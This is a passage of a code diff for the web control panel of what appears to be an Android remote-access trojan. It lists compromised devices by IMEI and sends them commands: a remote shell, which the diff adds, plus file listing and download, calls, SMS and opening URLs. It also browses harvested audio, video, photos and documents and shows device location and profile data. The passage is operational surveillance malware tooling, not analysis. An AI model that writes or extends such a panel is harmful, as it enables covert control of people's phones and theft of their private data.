+  const line = el.value.trim(); if (!line) return;
+  const parts = line.split(/\s+/);
+  await sendAction(parts[0], {arg: parts.slice(1).join(' ')});
+  el.value = '';
+}
+
+async function switchCat(btn, cat) {
+  curCat = cat;
+  document.querySelectorAll('.fb-cat').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  await refreshFiles();
+}
+
+async function refreshFiles() {
+  if (!sel) return;
+  const el = document.getElementById('fb-list');
+  el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">Loading...</div>';
+  try {
+    const r = await fetch('/api/files?imei=' + sel + '&category=' + curCat);
+    const d = await r.json();
+    const icons = {audio:'🎙️',video:'📹',photos:'📷',documents:'📄',system_data:'⚙️'};
+    if (!d.files || !d.files.length) {
+      el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:11px">No ' + curCat + ' files yet.</div>';
       return;
     }
-    list.innerHTML = clients.map((c, i) => `
-      <div class="client-item ${selectedClient === c.imei ? 'active' : ''}"
-           onclick="selectClient('${c.imei}', '${c.model}', '${c.ip}')">
-        <div class="client-dot"></div>
-        <div class="client-info">
-          <div class="client-name">${c.imei}</div>
-          <div class="client-sub">${c.model} · ${c.ip}</div>
-        </div>
-        <div style="color:var(--muted);font-size:10px;">#${i}</div>
-      </div>
-    `).join('');
-  }
+    el.innerHTML = d.files.map(f => `
+      <div class="fb-item">
+        <div class="fb-icon">${icons[curCat]||'📄'}</div>
+        <div class="fb-name">${esc(f.name)}</div>
+        <div class="fb-meta">${esc(f.size)}<br>${esc(f.modified.substring(0,16))}</div>
+      </div>`).join('');
+  } catch(e) { el.innerHTML = '<div style="padding:20px;color:var(--red);font-size:11px">Error: ' + esc(e.message) + '</div>'; }
+}
 
-  function selectClient(imei, model, ip) {
-    selectedClient = imei;
-    document.getElementById('no-client-msg').style.display = 'none';
-    const panel = document.getElementById('client-panel');
-    panel.style.display = 'flex';
-    document.getElementById('active-label').textContent = `▸ ${imei}`;
-    addLog('info', `Selected client: ${imei} (${model} · ${ip})`);
-    fetchClients();
-  }
+async function loadProfile(imei) {
+  try {
+    const r = await fetch('/api/profile?imei=' + imei);
+    const d = await r.json();
+    const el = document.getElementById('profile-panel');
+    if (!d.profile) { el.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px">No profile.</div>'; return; }
+    el.innerHTML = Object.entries(d.profile).map(([k,v]) => `
+      <div class="profile-field">
+        <div class="profile-key">${esc(k)}</div>
+        <div class="profile-val">${esc(v)}</div>
+      </div>`).join('');
+  } catch(e) {}
+}
 
-  // ── Actions ────────────────────────────────────────────────────────────────
-  async function sendAction(action, args = {}) {
-    if (!selectedClient) { addLog('error', 'No client selected.'); return; }
-    addLog('cmd', `→ ${action} ${JSON.stringify(args)}`);
-    try {
-      const r = await fetch('/api/command', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ imei: selectedClient, action, args })
-      });
-      const data = await r.json();
-      if (data.ok) addLog('success', `✓ Command sent on ch${data.channel}`);
-      else addLog('error', `✗ ${data.error}`);
-    } catch(e) {
-      addLog('error', `Request failed: ${e.message}`);
-    }
-  }
+function switchSideTab(tab) {
+  document.querySelectorAll('.sidebar-tabs .tab-btn').forEach((b,i) => b.classList.toggle('active',['live','saved'][i]===tab));
+  document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+  document.getElementById('side-'+tab).classList.add('active');
+}
 
-  async function sendRaw() {
-    const input = document.getElementById('raw-cmd');
-    const line = input.value.trim();
-    if (!line) return;
-    const parts = line.split(/\s+/);
-    const action = parts[0];
-    const arg = parts.slice(1).join(' ');
-    await sendAction(action, { arg });
-    input.value = '';
-  }
+function switchMainTab(tab) {
+  curTab = tab;
+  document.querySelectorAll('.main-tab').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-'+tab).classList.add('active');
+  document.querySelectorAll('.tab-panel').forEach(el => el.classList.remove('active'));
+  document.getElementById('panel-'+tab).classList.add('active');
+  if (tab==='map') { setTimeout(initMap,100); setTimeout(()=>map&&map.invalidateSize(),200); }
+  if (tab==='files') refreshFiles();
+  if (tab==='profile' && sel) loadProfile(sel);
+}
 
-  // ── Modal system ───────────────────────────────────────────────────────────
-  const MODAL_CONFIGS = {
-    dir:      { title: '📂 List Directory', fields: [{ name:'path', label:'Directory Path', placeholder:'/sdcard', type:'text' }] },
-    download: { title: '⬇️ Download File',  fields: [{ name:'path', label:'File Path on Device', placeholder:'/sdcard/DCIM/photo.jpg', type:'text' }] },
-    toast:    { title: '💬 Show Toast',     fields: [{ name:'msg', label:'Message to Display', placeholder:'Hello from CyberVision!', type:'text' }] },
-    vibrate:  { title: '📳 Vibrate Device', fields: [{ name:'ms', label:'Duration (milliseconds)', placeholder:'2000', type:'number' }] },
-    call:     { title: '📲 Make a Call',    fields: [{ name:'number', label:'Phone Number', placeholder:'+972501234567', type:'tel' }] },
-    send_sms: { title: '✉️ Send SMS',       fields: [
-      { name:'number', label:'Recipient Phone Number', placeholder:'+972501234567', type:'tel' },
-      { name:'body',   label:'Message Body', placeholder:'Type your message...', type:'textarea' }
-    ]},
-    url:      { title: '🌐 Open URL',       fields: [{ name:'url', label:'URL', placeholder:'https://example.com', type:'url' }] },
-  };
+const MODALS = {
+  shell:    {title:'💻 Shell',    fields:[{name:'arg',label:'Command',placeholder:'ls /sdcard',type:'text'}]},
+  dir:      {title:'📂 Dir',      fields:[{name:'arg',label:'Path',placeholder:'/sdcard',type:'text'}]},
+  download: {title:'⬇️ Download', fields:[{name:'arg',label:'File path',placeholder:'/sdcard/file.txt',type:'text'}]},
+  toast:    {title:'💬 Toast',    fields:[{name:'arg',label:'Message',placeholder:'Hello!',type:'text'}]},
+  vibrate:  {title:'📳 Vibrate',  fields:[{name:'arg',label:'Duration ms',placeholder:'2000',type:'number'}]},
+  call:     {title:'📲 Call',     fields:[{name:'arg',label:'Phone number',placeholder:'+972501234567',type:'tel'}]},
+  send_sms: {title:'✉️ SMS',      fields:[{name:'number',label:'Recipient',placeholder:'+972501234567',type:'tel'},{name:'body',label:'Message',placeholder:'...',type:'textarea'}]},
+  url:      {title:'🌐 URL',      fields:[{name:'arg',label:'URL',placeholder:'https://...',type:'url'}]},
+};
 
-  let currentModal = null;
+function openModal(action) {
+  const cfg = MODALS[action]; if (!cfg) { sendAction(action); return; }
+  currentModal = action;
+  document.getElementById('modal-title').textContent = cfg.title;
+  document.getElementById('modal-body').innerHTML = cfg.fields.map(f =>
+    `<div class="form-group"><label>${f.label}</label>${f.type==='textarea'?`<textarea id="mf-${f.name}" placeholder="${f.placeholder}"></textarea>`:`<input type="${f.type}" id="mf-${f.name}" placeholder="${f.placeholder}">`}</div>`
+  ).join('');
+  document.getElementById('modal-overlay').classList.add('show');
+  setTimeout(()=>document.querySelector('#modal-body input,#modal-body textarea')?.focus(),50);
+}
 
-  function openModal(action) {
-    const cfg = MODAL_CONFIGS[action];
-    if (!cfg) { sendAction(action); return; }
-    currentModal = action;
-    document.getElementById('modal-title').textContent = cfg.title;
-    document.getElementById('modal-body').innerHTML = cfg.fields.map(f => `
-      <div class="form-group">
-        <label>${f.label}</label>
-        ${f.type === 'textarea'
-          ? `<textarea id="mf-${f.name}" placeholder="${f.placeholder}"></textarea>`
-          : `<input type="${f.type}" id="mf-${f.name}" placeholder="${f.placeholder}">`
-        }
-      </div>
-    `).join('');
-    document.getElementById('modal-overlay').classList.add('show');
-    // Focus first field
-    setTimeout(() => {
-      const first = document.querySelector('#modal-body input, #modal-body textarea');
-      if (first) first.focus();
-    }, 50);
-  }
+function closeModal() { document.getElementById('modal-overlay').classList.remove('show'); currentModal=null; }
 
-  function closeModal() {
-    document.getElementById('modal-overlay').classList.remove('show');
-    currentModal = null;
-  }
+function submitModal() {
+  if (!currentModal) return;
+  const cfg = MODALS[currentModal];
+  const args = {};
+  cfg.fields.forEach(f => { const el=document.getElementById('mf-'+f.name); if(el) args[f.name]=el.value.trim(); });
+  const finalArgs = args.number ? args : {arg: args.arg||''};
+  sendAction(currentModal, finalArgs);
+  closeModal();
+}
 
-  function submitModal() {
-    if (!currentModal) return;
-    const cfg = MODAL_CONFIGS[currentModal];
-    const args = {};
-    for (const f of cfg.fields) {
-      const el = document.getElementById(`mf-${f.name}`);
-      args[f.name] = el ? el.value.trim() : '';
-    }
-    sendAction(currentModal, args);
-    closeModal();
-  }
+function addLog(type, msg) {
+  const area = document.getElementById('output-area');
+  const ts = new Date().toLocaleTimeString();
+  const div = document.createElement('div');
+  div.className = 'log-line ' + type;
+  div.innerHTML = '<span class="ts">' + ts + '</span><span class="msg">' + esc(msg) + '</span>';
+  area.appendChild(div);
+  area.scrollTop = area.scrollHeight;
+}
 
-  // ── Output log ─────────────────────────────────────────────────────────────
-  function addLog(type, msg) {
-    const area = document.getElementById('output-area');
-    const ts = new Date().toLocaleTimeString();
-    const div = document.createElement('div');
-    div.className = `log-entry ${type}`;
-    div.innerHTML = `<span class="ts">${ts}</span><span class="msg">${escHtml(msg)}</span>`;
-    area.appendChild(div);
-    area.scrollTop = area.scrollHeight;
-  }
+function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-  function clearOutput() {
-    document.getElementById('output-area').innerHTML = '';
-  }
+document.addEventListener('keydown', e => {
+  if (e.key==='Escape') closeModal();
+  if (e.key==='Enter' && currentModal && e.target.tagName!=='TEXTAREA') submitModal();
+});
 
-  function escHtml(s) {
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  }
-
-  // ── Keyboard shortcut: Enter in modal ─────────────────────────────────────
-  document.addEventListener('keydown', e => {
-    if (e.key === 'Escape') closeModal();
-    if (e.key === 'Enter' && currentModal && e.target.tagName !== 'TEXTAREA') submitModal();
-  });
-
-  startPolling();
+startPolling();
 </script>
 </body>
 </html>
